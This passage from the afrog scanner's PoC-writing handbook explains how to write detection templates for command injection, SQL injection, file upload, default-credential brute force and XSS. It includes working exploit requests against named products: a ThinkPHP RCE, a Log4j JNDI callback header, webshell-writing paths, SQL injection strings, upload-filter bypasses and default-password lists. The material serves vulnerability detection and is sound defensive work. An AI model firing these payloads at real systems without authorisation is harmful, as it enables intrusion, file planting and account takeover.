- **stop on hit**: join the chosen techniques with `||` at the top-level `expression` so no further requests are sent after a hit

### Write-then-read: drop a file, then read it back

Command injection is often used to write a webshell or drop a file, and these must be **verified by reading back** — "the request succeeded" is not a hit. Built-in PoC `amtt-eflow-hsia-server-ping-rce`:

```yaml
id: amtt-eflow-hsia-server-ping-rce

info:
  name: Amtt eflow Hsia Server Ping RCE
  author: YekkoY
  severity: high
  verified: false
  tags: amtt,eflow,hsia,rce
  created: 2023/10/25

set:
  r2: randomLowercase(10)

rules:
  r0:
    request:
      method: GET
      path: /manager/radius/server_ping.php?ip=127.0.0.1|echo%20"<?php%20echo%20md5({{r2}});unlink(__FILE__);?>">../../{{r2}}.php&id=1
    expression: response.status == 200 && response.body.bcontains(b"parent.doTestResult")
  r1:
    request:
      method: GET
      path: /{{r2}}.php
    expression: response.status == 200 && response.body.bcontains(bytes(md5(r2)))
expression: r0() && r1()
```

Key points:

- a random file name (`randomLowercase(10)`) avoids overwriting each other and is hard to guess
- the read-back verifies the content hash `bytes(md5(r2))`, confirming the file retrieved is the one we wrote
- the `unlink(__FILE__)` in the example makes the shell delete itself after running once, reducing the impact on the target
- the two anchors have distinct jobs: `r0` proves "the command ran", `r1` proves "the file really landed"

### No-echo: go through OOB

JNDI and deserialization usually produce no output at all, so only a callback confirms them. The injection point can be a header, a query, or the body, and the match is handed to `oobCheck`:

```yaml
id: demo-log4j-oob-rce

info:
  name: Demo Log4j JNDI no-echo detection
  author: your-name
  severity: critical
  tags: demo,rce,jndi,log4j

rules:
  r0:
    request:
      method: GET
      path: /websso/SAML2/SSO/vsphere.local?SAMLRequest=
      headers:
        X-Forwarded-For: "${jndi:ldap://{{oob.DNS}}/a}"
    expression: oobCheck("dns", 5)
expression: r0()
```

Key points:

- the injection point usually sits in a header (`X-Forwarded-For`, `User-Agent`, `Cookie`) or a JSON field in the body
- command injection instead usually goes in the query, joined with `;`, `|`, or `$()`, for example `?cid=1&nid=;ping%20{{oob.DNS}};`
- match with the current syntax `oobCheck("dns", 5)` / `oobCheck("http", 3)`
- do not write the v2 forms (`set: oob: oob()`, `{{oobDNS}}`, `oobCheck(oob, ...)`): those are detected as legacy OOB and **skipped at load time**
- the OOB platform must be configured first, see [Configuration](../user-guide/05-configuration.md); details in [OOB](./06-oob.md)

### Enumerating payload variants

The same vulnerability may have different route prefixes, available functions, and encodings across deployments, so payloads often have to be tried as a group. Use `brute` for multi-variable combinations (the default `clusterbomb` cartesian product). Built-in PoC `thinkphp-5022-5129-rce`:

```yaml
id: thinkphp-5022-5129-rce

info:
  name: Thinkphp 5.0.22&5.1.29 RCE
  author: zan8in
  severity: critical
  verified: true
  tags: thinkphp,rce
  created: 2025/10/27

rules:
  r0:
    brute:
      mode: clusterbomb
      commit: winner
      continue: false
      s:
        - index
        - manage
        - admin
      p:
        - "/?s=/{{s}}/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1"
        - "/?s=/{{s}}/\\think\\view\\driver\\php/display&content=<?php%20phpinfo();?>"
    request:
      method: GET
      path: "{{p}}"
    expression: |
      response.status == 200 &&
      response.body.bcontains(b'PHP Extension') &&
      response.body.bcontains(b'PHP Version') &&
      r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
expression: r0()
```

Key points:

- the two variables `s` (route prefix) and `p` (payload variant) are fully combined, so one rule covers several deployments
- the match picks features that only appear if the command really ran, such as the phpinfo page's `PHP Extension` + `PHP Version`, plus a regex confirming the version format
- stop on hit (`commit: winner` + `continue: false`) saves a lot of pointless requests

### False-positive control for this type

1. fixed output (`uid=0`, `whoami` results) is not trustworthy; always prove with a random value, random arithmetic, or a hash
2. write-then-read must be verified by reading back; seeing "the write request returned 200" is not a hit
3. no-echo cases must go through OOB; do not force a weak condition such as "status 200" or "the response got slower"
4. chain multi-stage cases with `&&` so "logged in but the command never ran" is not counted as a hit
5. payload encoding differences belong to the vulnerability itself and must be written down (`%20`, `%24(`, `%0D%0A`, double encoding), otherwise the PoC breaks on the next target

## SQL Injection

### Naming and discovery

The convention is to end the file name and `id` with `-sqli`; variants such as `-sqlinject`, `-sql-injection`, and `-sqi` also appear. Include `sqli` in `tags` (a few use `sql`).

In the built-in corpus this type lives mostly under `afrog-pocs/vulnerability/`, with some under `CVE/`, `CNVD/`, and `disclosure/`.

```bash
afrog -t https://example.com -s sqli
```

### First split: where does the result get read from

The match depends entirely on how the database output gets back into the response:

| Type | Evidence form | Depends on | Requests |
| --- | --- | --- | --- |
| Error-based | the database folds the result into an error message | a random value / error keyword in the body | 1 |
| UNION query | the query result is echoed straight into the page | version string, username, etc. in the body | 1 |
| Time-based blind | a change in response latency | `response.latency` | 2+ |
| Boolean blind | different responses for two inputs | a body / status-code difference | 2+ |

**Prefer the first two**: one request yields conclusive evidence and false positives are low. Only fall back to blind techniques when neither works — blind injection inherently needs a comparison and always costs more requests.

### Error-based: make the database spit out a random value

When `extractvalue` / `updatexml` hit an invalid XPath, they fold the "invalid content" into the error message, so a query result can be read as an error. The cheapest form is to put a random number straight into that error. Built-in PoC `xdcms-sqli`:

```yaml
id: xdcms-sqli

info:
  name: Xdcms sqli
  author: amos1
  severity: high
  verified: false
  tags: xdcms,sqli
  created: 2025/03/13

set:
  r1: randomInt(800000000, 1000000000)
  r2: randomInt(800000000, 1000000000)

rules:
  r0:
    request:
      method: POST
      path: /index.php?m=member&f=login_save
      body: |
        username=dd' or extractvalue(0x0a,concat(0x0a,{{r1}}*{{r2}}))#&password=dd&submit=+%B5%C7+%C2%BC+
    expression: response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
expression: r0()
```

Key points:

- one rule and one request is enough: inject `{{r1}}*{{r2}}` and match whether the product appears in the response
- `0x0a` is the newline character and `concat(0x0a, ...)` folds the result into the error
- `#` is the MySQL comment character, used to swallow the rest of the original statement

Built-in PoC `springblade-blade-user-list-sqli` uses the same idea with a different anchor, `md5` instead of a product:

```yaml
    expression: response.status == 500 && response.body.bcontains(b'XPATH syntax error:') && response.body.bcontains(bytes(substr(md5(string(rand1)), 0, 31)))
```

Two easily missed details here:

- **error output has a length limit**: a 32-character md5 gets truncated, so only the first 31 characters are matched (`substr(md5(...), 0, 31)`). Matching the full md5 would never hit
- **error-based injection often comes with 5xx**: this PoC matches `response.status == 500`, so do not reflexively write 200

### Time-based blind: make the latency track the injected delay

The point is not "did one attempt time out", but **alternating two different delay values at the same injection point and seeing whether the latency tracks each one**. Built-in PoC `jinher-c6-rssmoduleshttp-sqli`:

```yaml
id: jinher-c6-rssmoduleshttp-sqli

info:
  name: 金和OA RssModulesHttp.aspx接口SQL注入
  author: zan8in
  severity: high
  verified: true
  reference:
    - https://mp.weixin.qq.com/s/RM0gZfnSs4hsGa6MerqDog
  tags: jinher,sqli
  created: 2024/02/21

rules:
  r0:
    request:
      method: GET
      path: /C6/JHSoft.Web.WorkFlat/RssModulesHttp.aspx/?interfaceID=-1;WAITFOR+DELAY+%270:0:10%27--
    expression: response.status == 200 && response.latency <= 12000 && response.latency >= 10000
  r1:
    request:
      method: GET
      path: /C6/JHSoft.Web.WorkFlat/RssModulesHttp.aspx/?interfaceID=-1;WAITFOR+DELAY+%270:0:6%27--
    expression: response.status == 200 && response.latency <= 8000 && response.latency >= 6000
  r2:
    request:
      method: GET
      path: /C6/JHSoft.Web.WorkFlat/RssModulesHttp.aspx/?interfaceID=-1;WAITFOR+DELAY+%270:0:10%27--
    expression: response.status == 200 && response.latency <= 12000 && response.latency >= 10000
  r3:
    request:
      method: GET
      path: /C6/JHSoft.Web.WorkFlat/RssModulesHttp.aspx/?interfaceID=-1;WAITFOR+DELAY+%270:0:6%27--
    expression: response.status == 200 && response.latency <= 8000 && response.latency >= 6000
expression: r0() && r1() && r2() && r3()
```

(The `extractors` block in the original file is omitted here since it plays no part in the match.)

Key points:

- **you must alternate the two delay values** (here 10 → 6 → 10 → 6): only when the latency is genuinely controlled by the injected parameter do you get the pattern "inject 10 seconds and it is slow, inject 6 and it is fast". A single measurement landing in some range proves nothing — a target that is simply slow, or one lucky network hiccup, produces the same result. This is exactly why these PoCs appear to "send the same request twice": it is not redundancy
- **take the range as "delay + about 2 seconds"**: 6 seconds matches `6000~8000`, 10 seconds matches `10000~12000`, leaving room for network and scheduling jitter
- **pick the delay function by database**: SQL Server uses `WAITFOR DELAY '0:0:10'`, MySQL uses `SLEEP(10)`, PostgreSQL uses `pg_sleep(10)`
- **join at the top level with `&&`**: every round must land in its range. The request count of a time-based blind is the price it pays for accuracy

### UNION query echo

`UNION SELECT` stuffs the query result into a field the page was already going to render. Built-in PoC `zbintel-erp-getpersonalsealdata-sqli` pulls the database version directly:

```yaml
    path: /SYSN/json/pcclient/GetPersonalSealData.ashx?imageDate=1&userId=-1%20union%20select%20@@version--
    expression: |
      response.status == 200 &&
      response.body.ibcontains(b"Microsoft SQL Server") &&
      response.body.ibcontains(b'"SealData":') &&
      response.body.ibcontains(b'"Image":')
```

Key point: the decisive anchor is **the query result itself** (the version string returned by `@@version`); the two business fields only confirm "this response really is that normal endpoint". Judging on the business fields alone would make any normal response a hit. Other anchors in the same family are `user()`, `database()`, and `@@datadir`.

### From injection to further exploitation

SQL injection is often just the entry point, followed by file writing or command execution, and both paths reuse conclusions from earlier sections:

- **write a webshell then read it back**: built-in PoC `realor-getbsappurl-sqli` uses `select ... into outfile` to drop a php file under a random name, then a second rule fetches `/{{randstr}}.php` to verify the phpinfo signature — structurally identical to the "write-then-read" shape in RCE
- **`xp_cmdshell` command execution**: built-in PoC `yonyou-grp-u8-sqli-to-rce` runs `set/A {{r1}}*{{r2}}` inside `exec xp_cmdshell` and matches whether the product appears in the response — the same "arithmetic proof" technique as in RCE

### False-positive control for this type

1. the anchor must be something that can **only** appear when the injection works: a random value, a version-string format, or an error keyword such as `XPATH syntax error:`
2. do not judge on `response.status == 200` alone, and do not use the page's pre-existing business fields
3. error-based output has a length limit, so long random values must be truncated before matching (for example `substr(md5(...), 0, 31)`)
4. time-based blind has to prove "the latency tracks the injected delay" (alternate two delay values) rather than a single measurement landing in a range; also make sure the lower bound is below the upper bound
5. boolean blind needs pairs: construct true and false inputs for the same parameter and compare the difference
6. prefer error-based or UNION query (1 request); use blind techniques only when there is no echo, because they necessarily send more requests

## File Upload

### Naming and discovery

The convention is to end the file name and `id` with `-fileupload`; variants such as `-upload`, `-uploadfile`, `-file-upload`, and `-anyfile-upload` also appear. Include `fileupload` in `tags` (also seen: `upload`, `uploadfile`, `anyfile`).

In the built-in corpus this type lives mainly under `afrog-pocs/vulnerability/`, with some under `CNVD/`.

```bash
afrog -t https://example.com -s fileupload
```

### First split: how to prove the file really landed

An upload endpoint returning success does **not** mean the file landed, let alone that it is reachable. The three ways of confirming differ in both certainty and cost:

| Approach | Evidence | Requests |
| --- | --- | --- |
| Upload + read back | fetch the uploaded path and verify the content | 2 |
| Trust the upload response | the response explicitly returns the server-side file name or path | 1 |
| Trigger it in place | fetch the uploaded script and get the expected output | 2 |

Prefer the first two: they only prove "a file can be written", involve no real execution, and carry the lowest risk. The third is for cases where you genuinely need to verify "it can execute".

### Technique 1: upload + read back

The most conclusive form. Built-in PoC `vesystem-fileupload`:

```yaml
id: vesystem-fileupload

info:
  name: 和信云桌面未授权任意文件上传
  severity: critical
  author: 数星星
  verified: true
  tags: vesystem,fileupload,unauth
  created: 2025/03/13

set:
  r1: randomInt(10000, 99999)
  r2: randomLowercase(32)
  md5str: md5(r2)
  rboundary: randomLowercase(8)

rules:
  r0:
    request:
      method: POST
      path: /Upload/upload_file.php?l=test
      headers:
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
      body: |
        ------WebKitFormBoundary{{rboundary}}
        Content-Disposition: form-data; name="file"; filename="{{r1}}.php"
        Content-Type: image/avif

        {{md5str}}
        ------WebKitFormBoundary{{rboundary}}--
    expression: response.status == 200 && response.body.bcontains(b'_Requst:<br>')
  r1:
    request:
      method: GET
      path: /Upload/test/{{r1}}.php
    expression: response.status == 200 && response.body.bcontains(bytes(md5str))
expression: r0() && r1()
```

Key points:

- **the content written is the md5 of a random value** (`{{md5str}}`), not executable code. Reading that string back proves "the server really did land the file under the extension I chose, with controllable content" without actually writing a web shell
- **the file name is random** (`{{r1}}`): no overwriting, and the read-back confirms we fetched the copy we uploaded
- **the match has two clearly divided steps**: `r0` proves the upload endpoint accepted the request (`b'_Requst:<br>'` is that endpoint's response signature), `r1` proves the file is reachable and the content matches. The top level is `r0() && r1()`
- **`boundary` must match in both places and the body must end with `--<boundary>--`**: the boundary value in the `Content-Type` header has to be identical to every separator in the body, and the last line must be `--<boundary>--`
- **`Content-Type: image/avif` is a disguise**: the file name says `.php` while the type claims an image, to slip past type-only validation

**On line breaks: you no longer write `\r\n` by hand.** Just write the body as ordinary multi-line text. When `Content-Type` starts with `multipart/` and the body uses plain newlines (no `\r\n`), `afrog` converts each newline to CRLF and appends a trailing CRLF — hence the plain `body: |` in the example rather than the old `"\` + `\r\n\` folding style.

> Note that the header name must be written exactly as `Content-Type`: this check looks the header up by that key, so `content-type` will not trigger the automatic conversion.

### Technique 2: trust the upload response only, one request

If the upload endpoint returns the server-side file name, there is no need to read back. Built-in PoC `flink-upload-rce` sends a single request:

```yaml
      body: |
        --WebKitFormBoundary{{rboundary}}
        Content-Disposition: form-data; name="jarfile"; filename="{{r2}}.jar"
        Content-Type: application/octet-stream

        {{randbody}}
        --WebKitFormBoundary{{rboundary}}--
      follow_redirects: true
    expression: response.status == 200 && response.content_type.contains("application/json") && response.body.bcontains(b"success") && response.body.bcontains(bytes('_'+r2+'.jar'))
expression: r0()
```

Key points:

- the match includes **`_<random name>.jar`** — the server-side file name returned in the response. Matching `success` alone is not enough; you must see your own random file name appear
- the random file name (`{{r2}}`) acts as a "unique marker" here: its presence in the response shows this upload really was accepted and stored
- add `follow_redirects: true` explicitly when redirects must be followed

### Less boilerplate: built-in upload variables and self-deleting helpers

#### Built-in variables: no need to declare them yourself

The three random variables repeated most often in file upload PoCs are injected automatically by `afrog` per "target × PoC" execution cycle and can be used directly:

| Variable | Default | Common use |
| --- | --- | --- |
| `{{rboundary}}` | 8 random lowercase letters | the multipart `boundary` |
| `{{rfilename}}` | 6 random lowercase letters | the main part of the uploaded file name |
| `{{rbody}}` | 10 random lowercase letters | the marker string written as content |

In other words, the `set: rboundary: randomLowercase(8)` step in the two examples above can be dropped entirely and `{{rboundary}}` used straight away in `Content-Type` and the body. These values stay constant within one `target × poc` cycle, so the "upload" and "read back" steps line up naturally.

**`set` overrides the built-in values**: when you really need a longer random string (a 32-character marker, say), declare the same name in `set` — it is applied after the built-in injection, so it takes precedence.

#### Self-deleting helpers: skip the repeated clean-up code

Upload verification often wants the test file to clean up after itself. `afrog` ships helpers for four languages that, given a marker string, generate "print the marker, then delete yourself" content:

| Helper | Generated code shape |
| --- | --- |
| `jspDelete(rbody)` | JSP: print, then delete the current file |
| `phpDelete(rbody)` | PHP: `echo`, then `unlink(__FILE__)` |
| `aspxDelete(rbody)` | ASPX: print, then delete the current file |
| `aspDelete(rbody)` | ASP: print, then delete the current file |

Putting one in the body gives you a self-deleting test file:

```yaml
      headers:
        Content-Type: multipart/form-data; boundary=----{{rboundary}}
      body: |
        ------{{rboundary}}
        Content-Disposition: form-data; name="file"; filename="{{rfilename}}.jsp"
        Content-Type: image/jpeg

        {{jspDelete(rbody)}}
        ------{{rboundary}}--
```

The read-back then just matches `response.body.bcontains(bytes(rbody))` — the generated code prints `rbody`.

Two things to watch:

- a helper returns a **file-content string**, so it only belongs in request fields such as `body`; do not call it inside `expression`
- self-deletion is not a match condition. Even if the target blocks deletion, the vulnerability still holds as long as the marker string reads back

### What if the server renames the file

Plenty of upload endpoints rename the file, in which case the fetch path cannot be hard-coded and has to be **extracted** from the upload response. Built-in PoC `showdoc-fileupload` extracts "date + new file name":

```yaml
    output:
      search: '"(?P<date>\\d{4}-\\d{2}-\\d{2})\\\\/(?P<file>[a-f0-9]+\\.php)".bsubmatch(response.body)'
      date: search["date"]
      file: search["file"]
# the next rule:
    path: /Public/Uploads/{{date}}/{{file}}
```

Built-in PoC `yonyou-u8-doupload-fileupload` does the same, extracting only the file name:

```yaml
    output:
      search: '"\"(?P<jspname>.*?).jsp\";".bsubmatch(response.body)'
      jspname: search["jspname"]
# the next rule:
    path: /yyoa/portal/upload/{{jspname}}.jsp
```

Key point: use named regex groups (`(?P<name>...)`) to pull out just the fragment you need, then splice it into the next rule's `path`; and the read-back verification of the content is still mandatory.

### Extension and Content-Type bypass

The hard part of an upload vulnerability is usually not "sending the request" but "getting the file past the extension and type checks". What the corpus does:

- **forge the Content-Type**: file name `.php` while `Content-Type` says `image/avif`, `text/plain`, or `application/octet-stream` (one each across the three PoCs above)
- **insert special characters into the file name**: for example `{{r1}}.<>php` (this is how `showdoc-fileupload` slips past the extension blacklist)

Other common bypass ideas include parseable extensions such as `.phtml` / `.php5` / `.phar` / `.jsp` / `.jspx`, a trailing dot or space (`.php.`, `.php `), `%00` truncation, and mixed case.

But note: **these are bypass techniques, not match conditions**. The match must always rest on "can the file be fetched, and is the content right"; otherwise the PoC false-positives on any target with filtering.

### False-positive control for this type

1. seeing the upload endpoint return success (or 200) is not a hit; you must read the content back or confirm the server-side file name from the response
2. prefer a random value or a hash of one as the uploaded content rather than writing executable code
3. when writing multipart by hand, `boundary` must match in both places and the body must end with `--<boundary>--`; leave line endings to afrog's automatic conversion instead of writing `\r\n`
4. randomise the file name so files do not overwrite each other and the read-back confirms it is your own copy
5. clean up after the upload: self-deleting logic such as `unlink(__FILE__)` is tidier, but never make the match depend on it

## Weak Password Brute Force

### Naming and discovery

The convention is to end the file name and `id` with `-weak-login`; variants such as `-default-login`, `-default-password`, `-default-pwd`, `-weak-password`, and `-password` also appear. `tags` is mostly `default-login`, also seen `weak-login` and `default-password`, with protocol cases adding `network`.

This is the only type with a **directory of its own**: everything lives under `afrog-pocs/default-pwd/`.

Because both the `default-login` and `weak-login` tags are in use, try both when filtering:

```bash
afrog -t https://example.com -s default-login,weak-login
```

### First split: three shapes

| Shape | Approach | Requests |
| --- | --- | --- |
| HTTP · just a few default credentials | one rule per credential pair, joined at the top level with `\|\|` | equal to the number of pairs |
| HTTP · dictionary needed | `brute` over username × password | the cartesian-product size |
| Network protocol (SSH/MySQL/Redis…) | `type: go` + built-in plugin + `requires` gating | decided by the plugin |

### Shape 1: a few default credentials are enough

Most appliance-style systems have only one or two well-known default credentials, and writing them as rules is the simplest path. Built-in PoC `grafana-default-password`:

```yaml
id: grafana-default-password

info:
  name: Grafana Default Password
  author: For3stCo1d
  severity: high
  verified: true
  tags: grafana,default-login

rules:
  r0:
    request:
      method: POST
      path: /login
      headers:
        Content-Type: application/json
      body: '{"user":"admin","password":"admin"}'
    expression: response.status == 200 && response.body.bcontains(b'"message":') && response.body.bcontains(b'"Logged in"') && response.raw_header.bcontains(b'grafana_session')
  r1:
    request:
      method: POST
      path: /login
      headers:
        Content-Type: application/json
      body: '{"user":"admin","password":"prom-operator"}'
    expression: response.status == 200 && response.body.bcontains(b'"message":') && response.body.bcontains(b'"Logged in"') && response.raw_header.bcontains(b'grafana_session')
expression: r0() || r1()
```

Key points:

- one rule per credential pair, joined with `||` at the top level — a hit on any one of them means weak credentials exist
- **the match must rest on evidence of a successful login**: here the `"Logged in"` message plus the `grafana_session` cookie. Matching `status == 200` alone would count the login page itself as a hit
- read cookies with `response.raw_header` (the raw response headers), not `response.body`

Built-in PoC `activemq-default-password` is the Basic Auth variant, differing in that credentials must be encoded first and the match looks at content only available after login:

```yaml
set:
  admin: "base64('admin:admin')"
  user: "base64('user:user')"

rules:
  r0:
    request:
      method: GET
      path: /admin/
      headers:
        Authorization: Basic {{admin}}
    expression: |
      response.status == 200 && 
      response.body.ibcontains(b"Welcome to the Apache ActiveMQ Console of") && 
      response.body.bcontains(b"<h2>Broker</h2>")
expression: r0() || r1()
```

### Shape 2: reach for `brute` when a dictionary is needed

For the full semantics of `mode` / `commit` / `continue`, see [brute](./05-brute.md); only the two points specific to weak passwords are covered here. Built-in PoC `tomcat-weak-login`:

```yaml
  r1:
    brute:
      mode: clusterbomb
      commit: winner
      continue: false
      username:
        - admin
        - tomcat
        - manager
        - role1
        - both
      password:
        - admin
        - tomcat
        - manager
        - s3cret
        - 123456
        - admin123
        - changeme
    request:
      method: GET
      path: "{{p}}"
      headers:
        Authorization: "Basic {{base64(username + ':' + password)}}"
    expression: |
      response.status == 200 &&
      response.headers["set-cookie"].contains("JSESSIONID") &&
      (
        response.body.bcontains(b"Tomcat Manager Application") ||
        response.body.bcontains(b"<title>/manager</title>") ||
        response.body.bcontains(b"manager-gui")
      )
```

Key points:

- **brute variables can be encoded inside a request field**: `Authorization: "Basic {{base64(username + ':' + password)}}"`. Basic Auth wants the base64 of `user:pass`, and this "combine several iterated variables in the template, then encode" pattern is the key technique of this type
- **the sign of a successful login is obtaining a session**: the match uses `response.headers["set-cookie"].contains("JSESSIONID")` plus post-login page features. Without the session check, the login page matches too
- **enumeration results can be reused across rules**: this PoC's `r0` first uses `brute` to enumerate manager paths (including bypasses such as `/..;/manager/html`), and `r1` then references the path `r0` hit via `{{p}}`. That works because `commit: winner` commits the hit value as a variable
- **keep the dictionary small and precise**: what is listed here is the union of "default credentials + high-frequency weak passwords" (`admin`/`tomcat`/`s3cret`/`123456`…). `continue: false` only saves requests **after** a hit — **a target that is not vulnerable still walks the whole dictionary**, so a bigger dictionary raises the cost of the most common case

### Shape 3: network protocols use `type: go`

Brute-force logic for SSH / FTP / MySQL / Redis and similar protocols lives in Go plugins; the PoC only handles matching and extraction. Built-in PoC `ssh-weak-login`:

```yaml
id: ssh-weak-login

info:
  name: SSH Weak Login
  author: zan8in
  severity: high
  verified: true
  tags: network,ssh,default-login,weak-login
  requires: [ssh]

rules:
  r0:
    request:
      type: go
      data: ssh-weak-login
    expression: response.raw.bcontains(b"success;")
    extractors:
      - type: regex
        extractor:
          ext: '"user=(?P<username>[^;]*);pass=(?P<password>.*)$".bsubmatch(response.raw)'
          username: ext["username"]
          password: ext["password"]
expression: r0()
```

Key points:

- `type: go` with `data: <plugin name>` means "hand the request to a built-in Go plugin"; the name in `data` matches the `id`
- **`requires: [ssh]` gating matters especially here**: the plugin runs a whole dictionary against the target, so confirming the fingerprint is SSH first avoids wasting it on an HTTP port
- the plugin returns its result in a fixed format on `response.raw` (here `success;user=<username>;pass=<password>`), which is why `expression` matches `success;`
- after a hit, `extractors` pulls the username and password out of `response.raw` so the report shows which credentials worked
- the request count of this shape is decided inside the plugin and cannot be controlled from the PoC — **gating is the only cost switch**

### False-positive control for this type

1. the match must be evidence of a successful login: a session cookie, post-login content, or a new path after a redirect. Status codes are unreliable — failed logins commonly return 200 or 302 too
2. do not judge on `response.status == 200` alone, or the login page itself will match
3. in Basic Auth cases remember to `base64()` the credentials first
4. protocol cases must be gated with `requires`, otherwise you are running a dictionary blind against any port
5. keep the dictionary small and precise: `continue: false` only saves requests after a hit, and a non-vulnerable target still walks every combination

## XSS

### Naming and discovery

The convention is to end the file name and `id` with `-xss`, adding `reflected` / `stored` when the shape needs to be distinguished. Include `xss` in `tags`.

```bash
afrog -t https://example.com -s xss
```

### First split: reflected or stored

| Type | Evidence | Requests |
| --- | --- | --- |
| Reflected | the payload comes back in the same response | 1 |
| Stored | submit first, then fetch the display page | 2 |

### Reflected: match on unescaped echo

```yaml
id: demo-reflected-xss

info:
  name: Demo reflected XSS
  author: your-name
  severity: medium
  tags: demo,xss

set:
  marker: randomLowercase(8)
  payload_raw: '"><script>alert("{{marker}}")</script>'
  payload: urlencode(payload_raw)

rules:
  r0:
    request:
      method: GET
      path: /search?q={{payload}}
    expression: response.status == 200 && response.body.bcontains(bytes(payload_raw))
expression: r0()
```

Key points:

- **the payload must carry an unpredictable random string** (`{{marker}}`). This is where this type most often goes wrong: with a fixed payload such as `<script>alert(1)</script>`, any target that already contains that text (templates, documentation, example pages) false-positives
- **send the encoded `payload`, match the pre-encoding `payload_raw`**: the query needs `urlencode` to travel correctly, but the comparison must use the raw form — get either side wrong and it does not work
- **what is matched is "an unescaped echo"**. If the response contains the escaped form `&lt;script&gt;`, it was escaped and is not XSS. So do not use loose conditions such as `icontains("script")` or `icontains("alert")`

### Stored: submit and verify in two steps

```yaml
id: demo-stored-xss

info:
  name: Demo stored XSS
  author: your-name
  severity: medium
  tags: demo,xss

set:
  marker: randomLowercase(8)
  payload_raw: '<img src=x onerror=alert("{{marker}}")>'
  payload: urlencode(payload_raw)

rules:
  submit:
    request:
      method: POST
      path: /comment
      body: "name=test&comment={{payload}}"
    expression: response.status == 200

  verify:
    request:
      method: GET
      path: /comments
    expression: response.status == 200 && response.body.bcontains(bytes(payload_raw))
expression: submit() && verify()
```

Key points:

- **the two steps have clearly divided jobs**: `submit` only writes (a loose match, 200 is enough) while `verify` does the judging. A stored XSS cannot be judged from the submit response alone — a successful submit does not mean the content gets rendered
- you must **issue a separate request to the display page**, which is the fundamental difference from reflected XSS
- if the display path depends on an id returned by the submit, extract it with `output` first and splice it in (see "What if the server renames the file" in File Upload for the technique)
- the top level uses `&&`: both steps must hold

### False-positive control for this type

1. the payload must carry an unpredictable random string so that "it echoes back raw" can be matched; fixed payloads very easily collide with content the page already has
2. match on an unescaped echo: hitting `&lt;script&gt;` is not XSS
3. send the `urlencode`d string and match the pre-encoding original
4. stored XSS must be read back from the display page, not judged from the submit response
5. avoid loose conditions such as `icontains("alert")` or `icontains("script")`

## Appendix: PoC quality checklist

Once a PoC is written, run through these six points:

1. **Naming is consistent**: the file is `<poc_id>.yaml` and the `id` inside matches the file name
2. **Purpose is clear**: the `description` (or identifying information such as `fofa`) states which kind of target and which endpoint this PoC is for
3. **False positives are controlled**: `expression` has at least two independent conditions — a status code plus a body signature, or a body signature plus a response-header signature
4. **Gating comes first**: expensive PoCs (weak passwords, dictionary enumeration) must carry `requires`, and a matching fingerprint PoC must exist; see [requires](./04-requires.md)
5. **Requests are restrained**: no high-frequency or multi-path brute forcing by default; expand into a full verification chain only when necessary
6. **It is regression-testable**: it can be validated in your own minimal regression set — even if what you validate is "it does not false-positive"

> **← Previous:** [TCP / SSL](./08-tcp.md) ｜ **Handbook home:** [PoC Quickstart](./01-quickstart.md) ｜ **Next →:** [PoC Contributors](./10-contributors.md)
